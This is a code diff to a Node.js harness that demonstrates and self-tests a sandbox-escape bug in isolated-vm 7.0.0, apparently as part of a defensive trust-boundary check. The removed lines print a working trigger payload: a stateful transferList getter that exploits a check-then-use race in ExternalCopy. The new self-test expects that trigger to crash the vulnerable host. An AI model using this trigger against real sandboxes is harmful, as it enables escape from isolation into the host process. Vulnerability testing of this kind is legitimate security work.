@@ -36,26 +36,6 @@ const ADVISORY = {
   },
 };
 
-// The guest payload: minimal TOCTOU trigger. A stateful getter on transferList[0]
-// returns a genuine ArrayBuffer on first access (validation walk) and a plain
-// object on second access (unchecked walk). In 7.0.0 the unchecked cast to
-// ArrayBuffer* then dereferences attacker-influenced memory.
-const GUEST_PAYLOAD = `
-  const ivm = ivmRef.deref();
-  // Build a transferList with a stateful getter: returns a real ArrayBuffer on
-  // the first (validating) walk, an attacker-controlled value on the second
-  // (unchecked) walk. In 7.0.0 this drives the unchecked As<ArrayBuffer> cast
-  // in ExternalCopy to touch attacker-influenced memory in the host process.
-  let first = true;
-  const fake = { get length() { return 1; }, get 0() { if (first) { first = false; return new ArrayBuffer(8); } return {}; } };
-  try {
-    const copy = new ivm.ExternalCopy({}, { transferList: [fake] });
-    return 'escape-trigger: no-crash (bridge handled it)';
-  } catch (e) {
-    return 'escape-trigger: exception: ' + e.message;
-  }
-`;
-
 function runGuest(envDir) {
   // The child requires the payload module (avoids string-in-string quoting hell).
   const payloadPath = JSON.stringify(path.join(__dirname, "guest-payload.js"));
@@ -64,8 +44,12 @@ function runGuest(envDir) {
     const payload = require(${payloadPath});
     const isolate = new ivm.Isolate({ memoryLimit: 64 });
     const ctx = isolate.createContextSync();
-    // give the guest exactly one constrained host reference (the tool proxy)
-    const toolProxy = new ivm.Reference({ name: 'mcp-tool-proxy', call: () => ({ ok: true }) });
+    // give the guest exactly one constrained host reference (the tool proxy).
+    // guest-payload.js documents the contract "ivm.Reference to { x: 1 }":
+    // x must be present so ref.getSync('x', { externalCopy: true }) resolves
+    // to the real ExternalCopy constructor instead of an undefined-property
+    // fallback (Codex P1, PR #75).
+    const toolProxy = new ivm.Reference({ x: 1, name: 'mcp-tool-proxy', call: () => ({ ok: true }) });
     ctx.global.setSync('ref', toolProxy);
     // run the payload (already wrapped in an IIFE by the module)
     const result = ctx.evalSync(payload, { timeout: 2000 });
@@ -129,7 +113,7 @@ function main() {
 
   // Visor boundary manifest decision
   console.log("=== Visor Trust Plane: boundary manifest ===");
-  for (const [name, dir] of Object.entries(envs)) {
+  for (const [name] of Object.entries(envs)) {
     const v = versions[name];
     const affected = isAffected(v);
     console.log(`\n[${name}] execution requested`);
@@ -149,20 +133,37 @@ function main() {
     }
   }
 
-  // Self-test assertion: vulnerable env must be flagged affected, fixed must not
+  // Self-test: version classification, documented host-reference contract, and
+  // actual runGuest outcomes (vulnerable must crash; fixed must refuse cleanly).
   if (selfTest) {
     const vulnerableAffected = isAffected(versions.vulnerable);
     const fixedAffected = isAffected(versions.fixed);
+    const vulnerable = results.vulnerable;
+    const fixed = results.fixed;
     console.log("\n=== SELF-TEST ===");
     console.log(`vulnerable affected: ${vulnerableAffected} (expect true)`);
     console.log(`fixed affected: ${fixedAffected} (expect false)`);
-    if (vulnerableAffected && !fixedAffected) {
-      console.log("SELF-TEST PASS");
-      process.exit(0);
-    } else {
-      console.error("SELF-TEST FAIL");
+    console.log(`vulnerable crash: ${Boolean(vulnerable && vulnerable.crash)} (expect SIGSEGV/139)`);
+    console.log(`fixed crash: ${Boolean(fixed && fixed.crash)} (expect false)`);
+    console.log(`fixed ok: ${Boolean(fixed && fixed.ok)} (expect true, clean refusal)`);
+    const fail = (msg) => {
+      console.error(`SELF-TEST FAIL: ${msg}`);
       process.exit(1);
+    };
+    if (!vulnerableAffected || fixedAffected) {
+      fail("version classification: vulnerable must be affected, fixed must not");
     }
+    if (!vulnerable || !vulnerable.ok || !vulnerable.crash) {
+      fail("vulnerable env must crash (SIGSEGV / status 139); got: " + JSON.stringify(vulnerable));
+    }
+    if (!fixed || !fixed.ok || fixed.crash) {
+      fail("fixed env must not crash and must yield a clean refusal; got: " + JSON.stringify(fixed));
+    }
+    if (!/exception/i.test((fixed && fixed.output) || "")) {
+      fail("fixed env must yield a clean refusal/exception; got: " + ((fixed && fixed.output) || ""));
+    }
+    console.log("SELF-TEST PASS");
+    process.exit(0);
   }
 }
 
